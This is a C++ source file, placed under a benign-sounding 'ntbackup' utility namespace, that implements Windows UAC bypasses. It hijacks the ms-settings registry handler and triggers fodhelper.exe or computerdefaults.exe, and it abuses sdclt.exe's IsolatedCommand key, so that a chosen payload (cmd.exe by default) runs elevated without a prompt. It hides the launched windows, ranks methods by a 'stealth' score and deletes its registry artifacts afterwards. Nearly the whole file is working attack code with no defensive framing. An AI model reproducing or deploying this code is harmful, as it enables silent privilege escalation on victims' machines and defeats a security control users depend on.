#include "PrivilegesUtil.hpp"

#include <shlobj.h>
#include <sddl.h>
#include <stdio.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

namespace ntbackup::util {

constexpr DWORD DEFAULT_TIMEOUT_MS = 30000;
constexpr WCHAR DEFAULT_PAYLOAD[] = L"cmd.exe";

//
// Method metadata for auto-selection logic
//
struct METHOD_INFO {
    UAC_METHOD      Method;
    LPCWSTR         Name;
    DWORD           MinBuildNumber;
    DWORD           MaxBuildNumber;     // 0 = unfixed
    BOOL            RequiresX64;
    BOOL            RequiresAdminGroup;
    DWORD           StealthRating;      // 1 = LOW, 2 = MEDIUM, 3 = HIGH
};

static const METHOD_INFO g_MethodTable[] = {
    //                                                          x64    admin  stealth
    { UacMethodAuto,                 L"Auto",                 0,     0,     FALSE, FALSE, 0 },
    { UacMethodDebugObject,          L"DebugObject",          7600,  0,     FALSE, TRUE,  3 },
    { UacMethodFodHelper,            L"FodHelper",            10240, 0,     FALSE, FALSE, 2 },
    { UacMethodComputerDefaults,     L"ComputerDefaults",     17134, 0,     FALSE, FALSE, 2 },
    { UacMethodSdcltIsolatedCommand, L"SdcltIsolatedCommand", 10240, 17134, FALSE, FALSE, 2 },
};

//
// Forward declarations
//
static ELEVATION_STATUS ElevateViaDebugObject(_In_ PUAC_PARAMS pParams, _Inout_ PUAC_RESULT pResult);
static ELEVATION_STATUS ElevateViaFodHelper(_In_ PUAC_PARAMS pParams, _Inout_ PUAC_RESULT pResult);
static ELEVATION_STATUS ElevateViaComputerDefaults(_In_ PUAC_PARAMS pParams, _Inout_ PUAC_RESULT pResult);
static ELEVATION_STATUS ElevateViaSdcltIsolatedCommand(_In_ PUAC_PARAMS pParams, _Inout_ PUAC_RESULT pResult);

static DWORD GetWindowsBuildNumber();
static BOOL IsProcessX64();
static UAC_METHOD SelectBestMethod(_In_ DWORD dwFlags);
static ELEVATION_STATUS ValidateParams(_In_ PUAC_PARAMS pParams);
static LPCWSTR GetPayloadPath(_In_ PUAC_PARAMS pParams, _Out_writes_(cchBuffer) LPWSTR lpBuffer, _In_ DWORD cchBuffer);

//
// Shared helper for ms-settings based registry hijacks (fodhelper, computerdefaults)
//
static ELEVATION_STATUS
ElevateViaMsSettingsProtocol(
    _In_ PUAC_PARAMS pParams,
    _Inout_ PUAC_RESULT pResult,
    _In_ LPCWSTR lpTriggerBinary
);

// ============================================================================
// Public API
// ============================================================================

ELEVATION_STATUS
UacElevate(
    _In_ PUAC_PARAMS pParams,
    _Out_ PUAC_RESULT pResult
)
{
    if (!pResult) {
        return ELEVATION_ERR_INVALID_PARAMETER;
    }

    ZeroMemory(pResult, sizeof(UAC_RESULT));
    pResult->FailureStage = StagePreflightCheck;

    ELEVATION_STATUS status = ValidateParams(pParams);
    if (ELEVATION_FAILED(status)) {
        pResult->Status = status;
        pResult->dwWin32Error = ERROR_INVALID_PARAMETER;
        return status;
    }

    if (UacIsElevated()) {
        pResult->Status = ELEVATION_STATUS_ALREADY_ELEVATED;
        return ELEVATION_STATUS_ALREADY_ELEVATED;
    }

    UAC_METHOD method = pParams->Method;
    if (method == UacMethodAuto) {
        method = SelectBestMethod(pParams->dwFlags);
        if (method == UacMethodAuto) {
            pResult->Status = ELEVATION_ERR_OS_NOT_SUPPORTED;
            return ELEVATION_ERR_OS_NOT_SUPPORTED;
        }
    }

    if (!UacIsMethodSupported(method)) {
        pResult->Status = ELEVATION_ERR_METHOD_PATCHED;
        pResult->MethodUsed = method;
        return ELEVATION_ERR_METHOD_PATCHED;
    }

    if (UacMethodRequiresAdminGroup(method) && !UacIsAdminGroupMember()) {
        pResult->Status = ELEVATION_ERR_NOT_ADMIN_GROUP;
        pResult->MethodUsed = method;
        pResult->dwWin32Error = ERROR_ACCESS_DENIED;
        return ELEVATION_ERR_NOT_ADMIN_GROUP;
    }

    pResult->MethodUsed = method;

    if (pParams->lpPayloadPath) {
        pResult->FailureStage = StagePayloadValidation;
        DWORD attrs = GetFileAttributesW(pParams->lpPayloadPath);
        if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            pResult->Status = ELEVATION_ERR_PAYLOAD_NOT_FOUND;
            pResult->dwWin32Error = GetLastError();
            return ELEVATION_ERR_PAYLOAD_NOT_FOUND;
        }
    }

    switch (method) {
        case UacMethodDebugObject:
            status = ElevateViaDebugObject(pParams, pResult);
            break;

        case UacMethodFodHelper:
            status = ElevateViaFodHelper(pParams, pResult);
            break;

        case UacMethodComputerDefaults:
            status = ElevateViaComputerDefaults(pParams, pResult);
            break;

        case UacMethodSdcltIsolatedCommand:
            status = ElevateViaSdcltIsolatedCommand(pParams, pResult);
            break;

        default:
            status = ELEVATION_ERR_METHOD_NOT_IMPLEMENTED;
            break;
    }

    pResult->Status = status;
    return status;
}

ELEVATION_STATUS
UacElevateSimple(
    _In_ UAC_METHOD Method,
    _In_opt_ LPCWSTR lpCommandLine
)
{
    UAC_PARAMS params = { 0 };
    params.cbSize = sizeof(UAC_PARAMS);
    params.Method = Method;
    params.lpPayloadPath = lpCommandLine;
    params.lpPayloadArgs = nullptr;
    params.dwFlags = UAC_FLAG_NONE;
    params.dwTimeoutMs = DEFAULT_TIMEOUT_MS;

    UAC_RESULT result = { 0 };
    return UacElevate(&params, &result);
}

BOOL
UacIsMethodSupported(
    _In_ UAC_METHOD Method
)
{
    if (Method == UacMethodAuto || Method >= UacMethodMax) {
        return FALSE;
    }

    const METHOD_INFO* pInfo = &g_MethodTable[static_cast<DWORD>(Method)];
    DWORD buildNumber = GetWindowsBuildNumber();

    if (buildNumber < pInfo->MinBuildNumber) {
        return FALSE;
    }

    if (pInfo->MaxBuildNumber > 0 && buildNumber > pInfo->MaxBuildNumber) {
        return FALSE;
    }

    if (pInfo->RequiresX64 && !IsProcessX64()) {
        return FALSE;
    }

    return TRUE;
}

BOOL
UacMethodRequiresAdminGroup(
    _In_ UAC_METHOD Method
)
{
    if (Method == UacMethodAuto || Method >= UacMethodMax) {
        return TRUE;
    }

    return g_MethodTable[static_cast<DWORD>(Method)].RequiresAdminGroup;
}

DWORD
UacGetStatusMessage(
    _In_ ELEVATION_STATUS Status,
    _Out_writes_opt_(cchBuffer) LPWSTR lpBuffer,
    _In_ DWORD cchBuffer
)
{
    LPCWSTR message = nullptr;

    switch (Status) {
        case ELEVATION_SUCCESS:                     message = L"Elevation completed successfully"; break;
        case ELEVATION_STATUS_ALREADY_ELEVATED:     message = L"Process is already elevated"; break;
        case ELEVATION_ERR_GENERIC:                 message = L"Generic elevation error"; break;
        case ELEVATION_ERR_OS_NOT_SUPPORTED:        message = L"Operating system version not supported"; break;
        case ELEVATION_ERR_NOT_ADMIN_GROUP:         message = L"User is not a member of Administrators group"; break;
        case ELEVATION_ERR_METHOD_PATCHED:          message = L"Elevation method has been patched on this OS version"; break;
        case ELEVATION_ERR_METHOD_NOT_IMPLEMENTED:  message = L"Elevation method not implemented"; break;
        case ELEVATION_ERR_PAYLOAD_NOT_FOUND:       message = L"Payload executable not found"; break;
        case ELEVATION_ERR_PAYLOAD_EXECUTION:       message = L"Failed to execute elevated payload"; break;
        case ELEVATION_ERR_COM_INIT:                message = L"COM initialization failed"; break;
        case ELEVATION_ERR_COM_INTERFACE:           message = L"Failed to acquire COM interface"; break;
        case ELEVATION_ERR_FILE_OPERATION:          message = L"File operation failed"; break;
        case ELEVATION_ERR_REGISTRY_ACCESS:         message = L"Registry access failed"; break;
        case ELEVATION_ERR_TARGET_BINARY_NOT_FOUND: message = L"Target auto-elevate binary not found"; break;
        case ELEVATION_ERR_DLL_WRITE:               message = L"Failed to write DLL to target location"; break;
        case ELEVATION_ERR_DLL_HIJACK:              message = L"DLL hijack setup failed"; break;
        case ELEVATION_ERR_TOKEN_MANIPULATION:      message = L"Token manipulation failed"; break;
        case ELEVATION_ERR_TIMEOUT:                 message = L"Elevation operation timed out"; break;
        case ELEVATION_ERR_INVALID_PARAMETER:       message = L"Invalid parameter"; break;
        case ELEVATION_ERR_INSUFFICIENT_BUFFER:     message = L"Buffer too small"; break;
        case ELEVATION_ERR_ACCESS_DENIED:           message = L"Access denied"; break;
        case ELEVATION_ERR_CLEANUP_FAILED:          message = L"Artifact cleanup failed"; break;
        default:                                    message = L"Unknown error"; break;
    }

    DWORD required = static_cast<DWORD>(wcslen(message)) + 1;

    if (!lpBuffer || cchBuffer == 0) {
        return required;
    }

    if (cchBuffer < required) {
        return required;
    }

    wcscpy_s(lpBuffer, cchBuffer, message);
    return required - 1;
}

LPCWSTR
UacGetMethodName(
    _In_ UAC_METHOD Method
)
{
    if (Method >= UacMethodMax) {
        return nullptr;
    }

    return g_MethodTable[static_cast<DWORD>(Method)].Name;
}

BOOL
UacIsElevated(
    VOID
)
{
    BOOL elevated = FALSE;
    HANDLE hToken = nullptr;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation = { 0 };
        DWORD cbSize = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
            elevated = elevation.TokenIsElevated;
        }

        CloseHandle(hToken);
    }

    return elevated;
}

BOOL
UacIsAdminGroupMember(
    VOID
)
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;

    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(
            &ntAuthority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0,
            &adminGroup)) {

        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin;
}

// ============================================================================
// Internal Utilities
// ============================================================================

static DWORD
GetWindowsBuildNumber()
{
    static DWORD cachedBuild = 0;

    if (cachedBuild != 0) {
        return cachedBuild;
    }

    typedef NTSTATUS(NTAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        auto pRtlGetVersion = reinterpret_cast<RtlGetVersionPtr>(
            GetProcAddress(hNtdll, "RtlGetVersion"));

        if (pRtlGetVersion) {
            RTL_OSVERSIONINFOW osvi = { 0 };
            osvi.dwOSVersionInfoSize = sizeof(osvi);

            if (pRtlGetVersion(&osvi) == 0) {
                cachedBuild = osvi.dwBuildNumber;
            }
        }
    }

    if (cachedBuild == 0) {
        OSVERSIONINFOW osvi = { 0 };
        osvi.dwOSVersionInfoSize = sizeof(osvi);

        #pragma warning(suppress: 4996)
        if (GetVersionExW(&osvi)) {
            cachedBuild = osvi.dwBuildNumber;
        }
    }

    return cachedBuild;
}

static BOOL
IsProcessX64()
{
#ifdef _WIN64
    return TRUE;
#else
    return FALSE;
#endif
}

static UAC_METHOD
SelectBestMethod(
    _In_ DWORD dwFlags
)
{
    DWORD buildNumber = GetWindowsBuildNumber();
    BOOL isX64 = IsProcessX64();
    BOOL isAdminMember = UacIsAdminGroupMember();
    BOOL preferStealth = (dwFlags & UAC_FLAG_PREFER_STEALTH) != 0;

    UAC_METHOD bestMethod = UacMethodAuto;
    DWORD bestScore = 0;

    for (DWORD i = 1; i < UacMethodMax; i++) {
        const METHOD_INFO* pInfo = &g_MethodTable[i];

        if (buildNumber < pInfo->MinBuildNumber) {
            continue;
        }

        if (pInfo->MaxBuildNumber > 0 && buildNumber > pInfo->MaxBuildNumber) {
            continue;
        }

        if (pInfo->RequiresX64 && !isX64) {
            continue;
        }

        if (pInfo->RequiresAdminGroup && !isAdminMember) {
            continue;
        }

        DWORD score = 100;

        if (preferStealth) {
            score += pInfo->StealthRating * 50;
        }

        score += pInfo->StealthRating * 10;

        if (score > bestScore) {
            bestScore = score;
            bestMethod = pInfo->Method;
        }
    }

    return bestMethod;
}

static ELEVATION_STATUS
ValidateParams(
    _In_ PUAC_PARAMS pParams
)
{
    if (!pParams) {
        return ELEVATION_ERR_INVALID_PARAMETER;
    }

    if (pParams->cbSize != sizeof(UAC_PARAMS)) {
        return ELEVATION_ERR_INVALID_PARAMETER;
    }

    if (pParams->Method >= UacMethodMax) {
        return ELEVATION_ERR_INVALID_PARAMETER;
    }

    return ELEVATION_SUCCESS;
}

static LPCWSTR
GetPayloadPath(
    _In_ PUAC_PARAMS pParams,
    _Out_writes_(cchBuffer) LPWSTR lpBuffer,
    _In_ DWORD cchBuffer
)
{
    if (pParams->lpPayloadPath && pParams->lpPayloadPath[0] != L'\0') {
        return pParams->lpPayloadPath;
    }

    if (GetSystemDirectoryW(lpBuffer, cchBuffer)) {
        wcscat_s(lpBuffer, cchBuffer, L"\\cmd.exe");
        return lpBuffer;
    }

    return DEFAULT_PAYLOAD;
}

// ============================================================================
// Method Implementations
// ============================================================================

//
// DebugObject - Stub (requires admin group, complex implementation)
//
static ELEVATION_STATUS
ElevateViaDebugObject(
    _In_ PUAC_PARAMS pParams,
    _Inout_ PUAC_RESULT pResult
)
{
    pResult->FailureStage = StageComInitialization;
    pResult->dwWin32Error = ERROR_CALL_NOT_IMPLEMENTED;
    return ELEVATION_ERR_METHOD_NOT_IMPLEMENTED;
}

//
// Shared implementation for ms-settings protocol hijack
// Used by fodhelper.exe and computerdefaults.exe
//
static ELEVATION_STATUS
ElevateViaMsSettingsProtocol(
    _In_ PUAC_PARAMS pParams,
    _Inout_ PUAC_RESULT pResult,
    _In_ LPCWSTR lpTriggerBinary
)
{
    pResult->FailureStage = StageRegistrySetup;

    WCHAR payloadPath[MAX_PATH] = { 0 };
    LPCWSTR lpPayload = GetPayloadPath(pParams, payloadPath, MAX_PATH);

    WCHAR fullCommand[MAX_PATH * 2] = { 0 };
    if (pParams->lpPayloadArgs && pParams->lpPayloadArgs[0] != L'\0') {
        swprintf_s(fullCommand, L"\"%s\" %s", lpPayload, pParams->lpPayloadArgs);
    } else {
        swprintf_s(fullCommand, L"\"%s\"", lpPayload);
    }

    //
    // Create: HKCU\Software\Classes\ms-settings\Shell\open\command
    //
    HKEY hKey = nullptr;
    LONG regResult = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\Shell\\open\\command",
        0,
        nullptr,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_WOW64_64KEY,
        nullptr,
        &hKey,
        nullptr);

    if (regResult != ERROR_SUCCESS) {
        pResult->dwWin32Error = static_cast<DWORD>(regResult);
        return ELEVATION_ERR_REGISTRY_ACCESS;
    }

    regResult = RegSetValueExW(
        hKey,
        nullptr,
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(fullCommand),
        static_cast<DWORD>((wcslen(fullCommand) + 1) * sizeof(WCHAR)));

    if (regResult != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
        pResult->dwWin32Error = static_cast<DWORD>(regResult);
        return ELEVATION_ERR_REGISTRY_ACCESS;
    }

    //
    // DelegateExecute must be empty to trigger shell command execution
    //
    regResult = RegSetValueExW(
        hKey,
        L"DelegateExecute",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(L""),
        sizeof(WCHAR));

    RegCloseKey(hKey);

    if (regResult != ERROR_SUCCESS) {
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
        pResult->dwWin32Error = static_cast<DWORD>(regResult);
        return ELEVATION_ERR_REGISTRY_ACCESS;
    }

    pResult->FailureStage = StageTriggerExecution;

    //
    // Launch trigger binary via cmd.exe
    //
    WCHAR cmdLine[MAX_PATH * 2] = { 0 };
    swprintf_s(cmdLine, L"cmd.exe /c \"%s\"", lpTriggerBinary);

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    BOOL result = CreateProcessW(
        nullptr,
        cmdLine,
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi);

    if (!result) {
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
        pResult->dwWin32Error = GetLastError();
        return ELEVATION_ERR_PAYLOAD_EXECUTION;
    }

    WaitForSingleObject(pi.hProcess, 5000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    pResult->FailureStage = StageCleanup;

    if (!(pParams->dwFlags & UAC_FLAG_NO_CLEANUP)) {
        Sleep(1000);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    }

    return ELEVATION_SUCCESS;
}

//
// FodHelper - ms-settings protocol hijack via fodhelper.exe
//
static ELEVATION_STATUS
ElevateViaFodHelper(
    _In_ PUAC_PARAMS pParams,
    _Inout_ PUAC_RESULT pResult
)
{
    return ElevateViaMsSettingsProtocol(
        pParams,
        pResult,
        L"C:\\Windows\\System32\\fodhelper.exe");
}

//
// ComputerDefaults - ms-settings protocol hijack via computerdefaults.exe
//
static ELEVATION_STATUS
ElevateViaComputerDefaults(
    _In_ PUAC_PARAMS pParams,
    _Inout_ PUAC_RESULT pResult
)
{
    return ElevateViaMsSettingsProtocol(
        pParams,
        pResult,
        L"C:\\Windows\\System32\\computerdefaults.exe");
}

//
// SdcltIsolatedCommand - Registry hijack via sdclt.exe
// Uses different registry path than fodhelper
//
static ELEVATION_STATUS
ElevateViaSdcltIsolatedCommand(
    _In_ PUAC_PARAMS pParams,
    _Inout_ PUAC_RESULT pResult
)
{
    pResult->FailureStage = StageRegistrySetup;

    WCHAR payloadPath[MAX_PATH] = { 0 };
    LPCWSTR lpPayload = GetPayloadPath(pParams, payloadPath, MAX_PATH);

    WCHAR fullCommand[MAX_PATH * 2] = { 0 };
    if (pParams->lpPayloadArgs && pParams->lpPayloadArgs[0] != L'\0') {
        swprintf_s(fullCommand, L"\"%s\" %s", lpPayload, pParams->lpPayloadArgs);
    } else {
        swprintf_s(fullCommand, L"\"%s\"", lpPayload);
    }

    //
    // Create: HKCU\Software\Classes\exefile\shell\runas\command
    //
    HKEY hKey = nullptr;
    LONG regResult = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Classes\\exefile\\shell\\runas\\command",
        0,
        nullptr,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_WOW64_64KEY,
        nullptr,
        &hKey,
        nullptr);

    if (regResult != ERROR_SUCCESS) {
        pResult->dwWin32Error = static_cast<DWORD>(regResult);
        return ELEVATION_ERR_REGISTRY_ACCESS;
    }

    //
    // Set default value (unused but required)
    //
    regResult = RegSetValueExW(
        hKey,
        nullptr,
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(L""),
        sizeof(WCHAR));

    if (regResult != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\exefile");
        pResult->dwWin32Error = static_cast<DWORD>(regResult);
        return ELEVATION_ERR_REGISTRY_ACCESS;
    }

    //
    // Set IsolatedCommand - this is what sdclt.exe reads
    //
    regResult = RegSetValueExW(
        hKey,
        L"IsolatedCommand",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(fullCommand),
        static_cast<DWORD>((wcslen(fullCommand) + 1) * sizeof(WCHAR)));

    RegCloseKey(hKey);

    if (regResult != ERROR_SUCCESS) {
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\exefile");
        pResult->dwWin32Error = static_cast<DWORD>(regResult);
        return ELEVATION_ERR_REGISTRY_ACCESS;
    }

    pResult->FailureStage = StageTriggerExecution;

    //
    // Launch sdclt.exe with /kickoffelev to trigger IsolatedCommand
    //
    WCHAR cmdLine[] = L"cmd.exe /c C:\\Windows\\System32\\sdclt.exe /kickoffelev";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    BOOL result = CreateProcessW(
        nullptr,
        cmdLine,
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi);

    if (!result) {
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\exefile");
        pResult->dwWin32Error = GetLastError();
        return ELEVATION_ERR_PAYLOAD_EXECUTION;
    }

    WaitForSingleObject(pi.hProcess, 5000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    pResult->FailureStage = StageCleanup;

    if (!(pParams->dwFlags & UAC_FLAG_NO_CLEANUP)) {
        Sleep(1000);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\exefile");
    }

    return ELEVATION_SUCCESS;
}

} // namespace ntbackup::util